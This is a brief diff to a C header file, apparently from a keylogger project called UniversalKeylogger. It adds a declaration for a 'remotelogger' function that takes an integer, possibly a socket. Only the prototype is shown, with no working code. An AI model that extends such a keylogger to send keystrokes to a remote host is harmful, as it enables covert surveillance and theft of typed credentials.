@@ -86,4 +86,6 @@ void convert(int keycode);
 
 void searchActiveWindow(void);
 
+void remotelogger(int s);
+
 #endif //UNIVERSALKEYLOGGER_KEYLOGGER_H
